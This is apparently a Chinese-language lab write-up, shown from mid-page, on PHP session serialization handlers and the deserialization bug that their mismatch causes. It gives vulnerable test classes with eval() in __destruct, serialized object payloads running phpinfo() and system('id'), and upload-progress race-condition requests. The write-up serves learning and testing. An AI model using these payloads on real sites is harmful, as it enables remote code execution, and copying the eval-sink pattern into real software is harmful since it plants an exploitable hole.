<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload_progress_flag&#123;this is fuck flag&#125;</span><br><span class="line">|a:5:&#123;s:10:&quot;start_time&quot;;i:1704606442;s:14:&quot;content_length&quot;;i:51477;s:15:&quot;bytes_processed&quot;;i:5250;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:&#123;i:0;a:7:&#123;s:10:&quot;field_name&quot;;s:4:&quot;file&quot;;s:4:&quot;name&quot;;s:9:&quot;zixyd.jpg&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1704606442;s:15:&quot;bytes_processed&quot;;i:5250;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>





<h2 id="session-unser"><a href="#session-unser" class="headerlink" title="session_unser"></a>session_unser</h2><h3 id="PHP-session序列化机制"><a href="#PHP-session序列化机制" class="headerlink" title="PHP session序列化机制"></a>PHP session序列化机制</h3><p>根据<code>php.ini</code>中的配置项，我们研究将<code>$_SESSION</code>中保存的所有数据序列化存储到<code>PHPSESSID</code>对应的文件中，使用的三种不同的处理格式，即<code>session.serialize_handler</code>定义的三种引擎：</p>
<table>
<thead>
<tr>
<th>处理器</th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td align="left">键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td align="left">键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</td>
</tr>
<tr>
<td>php_serialize (php&gt;&#x3D;5.5.4)</td>
<td align="left">经过 serialize() 函数反序列处理的数组</td>
</tr>
</tbody></table>
<h4 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h4><p>这里为了加深说明除了<code>session_start</code>函数，还可以用<code>session.auto_start</code>配置，我接下来的使用将不使用函数，而是更改配置;（这样改配置本来没有问题，但是这样改配置达不到看处理器不同而存储的序列化数据不同，听不懂？ 下面会说明）</p>
<p>我的实验环境是：kali+nginx+fpm</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo find / -name php.ini                               </span><br><span class="line">/var/lib/docker/overlay2/6caa6f28e81c757ee588fab97a4e7c7cad8bd0fe73be2dbee11c82589c664d06/diff/etc/php5/apache2/php.ini</span><br><span class="line">/var/lib/docker/overlay2/6caa6f28e81c757ee588fab97a4e7c7cad8bd0fe73be2dbee11c82589c664d06/diff/etc/php5/cli/php.ini</span><br><span class="line">/etc/php/8.2/apache2/php.ini</span><br><span class="line">/etc/php/8.2/cli/php.ini</span><br><span class="line">/etc/php/8.2/fpm/php.ini</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo vim /etc/php/8.2/fpm/php.ini</span><br><span class="line">修改： session.auto_start = 1</span><br><span class="line"></span><br><span class="line">重启fpm服务使得php.ini生效</span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ systemctl restart php8.2-fpm.service</span><br></pre></td></tr></table></figure>

<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里可以看到，未使用<code>session_start</code>函数;Cookie却存在PHPSESSID</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240107142522.png"></p>
<p>来看看php处理器将数据序列化的形式</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/var/lib/php/sessions]</span><br><span class="line">└─<span class="comment"># pwd   </span></span><br><span class="line">/var/lib/php/sessions</span><br><span class="line">                                                                                                </span><br><span class="line">┌──(root㉿kali)-[/var/lib/php/sessions]</span><br><span class="line">└─<span class="comment"># ls -al</span></span><br><span class="line">总计 772</span><br><span class="line">drwx-wx-wt 2 root     root     778240  1月 7日 14:25 .</span><br><span class="line">drwxr-xr-x 4 root     root       4096 2023年 4月 5日 ..</span><br><span class="line">-rw------- 1 www-data www-data     17  1月 7日 14:25 sess_bb95aoqqkmvq2ltbpcdlu16hvh</span><br><span class="line">                                                                                                </span><br><span class="line">┌──(root㉿kali)-[/var/lib/php/sessions]</span><br><span class="line">└─<span class="comment"># cat sess_bb95aoqqkmvq2ltbpcdlu16hvh </span></span><br><span class="line">name|s:5:<span class="string">&quot;zixyd&quot;</span>;    </span><br></pre></td></tr></table></figure>



<h4 id="php-serialize处理器"><a href="#php-serialize处理器" class="headerlink" title="php_serialize处理器"></a>php_serialize处理器</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里我已经将<code>session.serialize_handler</code>改成了<code>php_serialize</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240107144109.png"></p>
<p>但是数据函数以php处理器方式存储的；经过排查找到原因：<code>ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);</code>只对当前文件的<code>session_start</code>函数有效；而对php.ini中的配置无效，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="keyword">var</span>/lib/php/sessions]</span><br><span class="line">└─<span class="comment"># ls -al</span></span><br><span class="line">总计 <span class="number">776</span></span><br><span class="line">drwx-wx-wt <span class="number">2</span> root     root     <span class="number">778240</span>  <span class="number">1</span>月 <span class="number">7</span>日 <span class="number">14</span>:<span class="number">40</span> .</span><br><span class="line">drwxr-xr-x <span class="number">4</span> root     root       <span class="number">4096</span> <span class="number">2023</span>年 <span class="number">4</span>月 <span class="number">5</span>日 ..</span><br><span class="line">-rw------- <span class="number">1</span> www-data www-data     <span class="number">17</span>  <span class="number">1</span>月 <span class="number">7</span>日 <span class="number">14</span>:<span class="number">25</span> sess_bb95aoqqkmvq2ltbpcdlu16hvh</span><br><span class="line">-rw------- <span class="number">1</span> www-data www-data     <span class="number">17</span>  <span class="number">1</span>月 <span class="number">7</span>日 <span class="number">14</span>:<span class="number">40</span> sess_mekil2i1boqaof0g4rohu4ef8p</span><br><span class="line">                                                                                                </span><br><span class="line">┌──(root㉿kali)-[/<span class="keyword">var</span>/lib/php/sessions]</span><br><span class="line">└─<span class="comment"># cat sess_mekil2i1boqaof0g4rohu4ef8p</span></span><br><span class="line">name|s:<span class="number">5</span>:<span class="string">&quot;zixyd&quot;</span>;      </span><br></pre></td></tr></table></figure>

<p>所以我又将php.ini中的<code>session.auto</code>改回了0，并在文件中添加<code>session_start();</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240107144835.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/var/lib/php/sessions]</span><br><span class="line">└─<span class="comment"># cat sess_6bf6o57tcu6h8735crmc0845e1</span></span><br><span class="line">a:1:&#123;s:4:<span class="string">&quot;name&quot;</span>;s:5:<span class="string">&quot;zixyd&quot;</span>;&#125;   </span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php:			 name|s:5:&quot;zixyd&quot;; </span><br><span class="line">php_serialize:	  a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;zixyd&quot;;&#125;   </span><br></pre></td></tr></table></figure>



<h3 id="session的反序列化漏洞利用"><a href="#session的反序列化漏洞利用" class="headerlink" title="session的反序列化漏洞利用"></a>session的反序列化漏洞利用</h3><p>session的反序列化漏洞，就是利用<code>php</code>处理器和<code>php_serialize</code>处理器的存储格式差异而产生，通过具体的代码我们来看下漏洞出现的原因</p>
<h4 id="实验一-1"><a href="#实验一-1" class="headerlink" title="实验一"></a>实验一</h4><p>创建一个test.php，使用<code>php_serialize</code>处理器；</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;zixyd&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;zixyd&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;zixyd&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>创建一个shell.php，默认使用php处理器</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">shell</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title function_ invoke__">shell</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">shell</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">shell</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:5:&quot;shell&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>将<code>|O:5:&quot;shell&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code>url编码；访问<code>test.php</code>；将恶意数据存储到session文件中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.6.98/test.php?zixyd=%7CO%3A5%3A%22shell%22%3A1%3A%7Bs%3A4%3A%22name%22%3Bs%3A10%3A%22phpinfo()%3B%22%3B%7D</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/var/lib/php/sessions]</span><br><span class="line">└─<span class="comment"># cat sess_6bf6o57tcu6h8735crmc0845e1</span></span><br><span class="line">a:1:&#123;s:5:<span class="string">&quot;zixyd&quot;</span>;s:46:<span class="string">&quot;|O:5:&quot;</span>shell<span class="string">&quot;:1:&#123;s:4:&quot;</span>name<span class="string">&quot;;s:10:&quot;</span>phpinfo();<span class="string">&quot;;&#125;&quot;</span>;&#125; </span><br></pre></td></tr></table></figure>

<p>可以看到恶意数据已经成功存储到了session文件，直接访问shell.php即可执行phpinfo</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240107150745.png"></p>
<p>php处理器会以<code>|</code>作为分隔符，将<code>O:5:&quot;shell&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code>反序列化，就会触发<code>__wakeup()</code>方法，最后对象销毁执行<code>__destruct()</code>方法中的<code>eval()</code>函数</p>
<h4 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h4><p>创建一个test2.php文件内容如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">zixyd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mdzz = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;phpinfo&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$m</span> = <span class="keyword">new</span> <span class="title function_ invoke__">zixyd</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>查看phpinfo</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32784/index.php?phpinfo=1</span><br></pre></td></tr></table></figure>

<p>从phpinfo中寻找重要信息如下：</p>
<table>
<thead>
<tr>
<th>Directive</th>
<th>Local Value</th>
<th>Master Value</th>
</tr>
</thead>
<tbody><tr>
<td>session.auto_start</td>
<td>Off</td>
<td>Off</td>
</tr>
<tr>
<td>session.save_path</td>
<td>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions</td>
<td>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions</td>
</tr>
<tr>
<td>session.serialize_handler</td>
<td>php</td>
<td>php_serialize</td>
</tr>
<tr>
<td>session.upload_progress.enabled</td>
<td>on</td>
<td>on</td>
</tr>
<tr>
<td>session.upload_progress.cleanup</td>
<td>Off</td>
<td>Off</td>
</tr>
<tr>
<td>session.upload_progress.name</td>
<td>PHP_SESSION_UPLOAD_PROGRESS</td>
<td>PHP_SESSION_UPLOAD_PROGRESS</td>
</tr>
<tr>
<td>session.upload_progress.prefix</td>
<td>upload_progress_</td>
<td>upload_progress_</td>
</tr>
<tr>
<td>session.use_strict_mode</td>
<td>Off</td>
<td>Off</td>
</tr>
</tbody></table>
<p>可见<code>php.ini</code>中<code>session.serialize_handler = php_serialize</code>，当前目录中被设置为<code>session.serialize_handler = php</code>，因此存在session反序列化利用的条件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">local value(局部变量：作用于当前目录程序，会覆盖master value内容):php</span><br><span class="line">master value(主变量：php.ini里面的内容):php_serialize</span><br></pre></td></tr></table></figure>

<p>那么我们如何找到代码入口将利用代码写入到<code>session</code>文件？想要写入<code>session</code>文件就得想办法在<code>$_SESSION</code>变量中增加我们可控的输入点，这里可以利用<code>session.upload_progress</code>,因为这样的话<code>session.upload_progress.name  </code>和<code>filename</code>的值都可控制；</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">zixyd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">zixyd</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;mdzz = <span class="string">&#x27;system(&quot;id&quot;);&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//O:5:&quot;zixyd&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:13:&quot;system(&quot;id&quot;);&quot;;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>还是利用那个文件上传的html文件</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.6.98/test2.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里有个奇怪的点就是：我将<code>session.upload_progress.cleanup  </code>关了，但依然没有用，文件上传的信息依然没有，最终还是利用条件竞争</p>
<p><code>|O:5:&quot;zixyd&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:13:&quot;system(&quot;id&quot;);&quot;;&#125;</code>注意这里有一个<code>|</code>，这里可以把payload放到<code>session.upload_progress.name  </code>和<code>filename</code>都是可以的</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test2.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.6.98</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------8126225181410704334410916334</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>361</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>null</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=ir85hm42ah4mln0ko3svp355ci</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------8126225181410704334410916334</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">§<span class="number">1</span>§|O:<span class="number">5</span>:&quot;zixyd&quot;:<span class="number">1</span>:&#123;s:<span class="number">4</span>:&quot;mdzz&quot;;s:<span class="number">13</span>:&quot;system(&quot;id&quot;);&quot;;&#125;</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------8126225181410704334410916334</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;1.md&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: application/octet-stream</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">1</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------8126225181410704334410916334--</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/test2.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.6.98</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=ir85hm42ah4mln0ko3svp355ci</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">haha</span><span class="operator">=</span>§<span class="number">1</span>§</span></span><br><span class="line"><span class="language-abnf"></span></span><br></pre></td></tr></table></figure>

<p>success</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240107161216.png"></p>
<p>最后放一张流程图,虽然和我做的实验不一样，但是意思就是这个意思，<strong>参考</strong>：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39664643/article/details/123478019">F4ke12138</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/session2.png"></p>
